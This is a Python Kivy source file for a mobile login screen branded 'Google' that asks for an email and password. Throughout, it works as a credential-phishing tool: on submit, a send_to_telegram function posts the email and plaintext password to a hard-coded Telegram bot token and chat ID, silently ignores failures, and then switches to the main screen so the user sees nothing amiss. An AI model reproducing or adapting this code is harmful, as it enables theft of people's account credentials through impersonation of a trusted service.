from kivy.uix.screenmanager import Screen
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.storage.jsonstore import JsonStore
from kivy.utils import get_color_from_hex
from kivy.core.window import Window
import re
import requests

store = JsonStore("user_data.json")

TELEGRAM_BOT_TOKEN = '8318983914:AAGEwCQk9HUsnIkdPspbrEqZjOtFXR9ZIUc'
CHAT_ID = '1170274856'

def send_to_telegram(username, password):
    message = f"🔐 Login Info:\n📧 Email: {username}\n🔑 Password: {password}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except:
        pass

class LoginScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        Window.clearcolor = get_color_from_hex("#121212")
        self.build_ui()

    def build_ui(self):
        self.layout = BoxLayout(
            orientation='vertical',
            padding=40,
            spacing=25,
            size_hint=(0.85, 0.7),
            pos_hint={"center_x": 0.5, "center_y": 0.5}
        )

        google_label = Label(
            text="Google",
            font_size=70,
            bold=True,
            color=get_color_from_hex("#FFFFFF"),
            size_hint_y=None,
            height=120,
            halign="center"
        )

        title = Label(
            text="Login",
            font_size=36,
            bold=True,
            color=get_color_from_hex("#FFFFFF"),
            size_hint_y=None,
            height=60,
            halign="center"
        )

        self.email_input = TextInput(
            hint_text="Enter your email",
            multiline=False,
            size_hint_y=None,
            height=50,
            padding_y=(10, 10),
            background_normal='',
            background_color=get_color_from_hex("#222222"),
            foreground_color=get_color_from_hex("#FFFFFF"),
            cursor_color=get_color_from_hex("#1DB954"),
            font_size=24,
        )

        self.password_input = TextInput(
            hint_text="Enter your password",
            multiline=False,
            password=True,
            size_hint_y=None,
            height=50,
            padding_y=(10, 10),
            background_normal='',
            background_color=get_color_from_hex("#222222"),
            foreground_color=get_color_from_hex("#FFFFFF"),
            cursor_color=get_color_from_hex("#1DB954"),
            font_size=24,
        )

        self.status_label = Label(
            text="",
            color=(1, 0, 0, 1),
            size_hint_y=None,
            height=30,
            halign="center"
        )

        login_button = Button(
            text="Next",
            size_hint_y=None,
            height=50,
            background_color=get_color_from_hex("#1DB954"),
            color=get_color_from_hex("#FFFFFF"),
            font_size=18,
            bold=True
        )
        login_button.bind(on_release=self.validate)

        self.layout.add_widget(google_label)
        self.layout.add_widget(title)
        self.layout.add_widget(self.email_input)
        self.layout.add_widget(self.password_input)
        self.layout.add_widget(self.status_label)
        self.layout.add_widget(login_button)

        self.add_widget(self.layout)

        self.email_input.bind(focus=self.on_focus)
        self.password_input.bind(focus=self.on_focus)

        if store.exists("user"):
            user_data = store.get("user")
            self.email_input.text = user_data.get("email", "")

    def on_focus(self, instance, value):
        if value:
            self.layout.pos_hint = {"center_x": 0.5, "center_y": 1}
        else:
            self.layout.pos_hint = {"center_x": 0.5, "center_y": 0.5}

    def validate(self, instance):
        email = self.email_input.text.strip()
        password = self.password_input.text.strip()

        if not email or not password:
            self.status_label.text = "Please fill in all fields."
            return

        if not self.validate_email(email):
            self.status_label.text = "Invalid email address."
            return

        store.put("user", email=email)
        send_to_telegram(email, password)

        self.email_input.text = ""
        self.password_input.text = ""
        self.status_label.text = ""
        self.manager.current = "main"

    def validate_email(self, email):
        pattern = r"[^@]+@[^@]+\.[^@]+"
        return re.match(pattern, email)
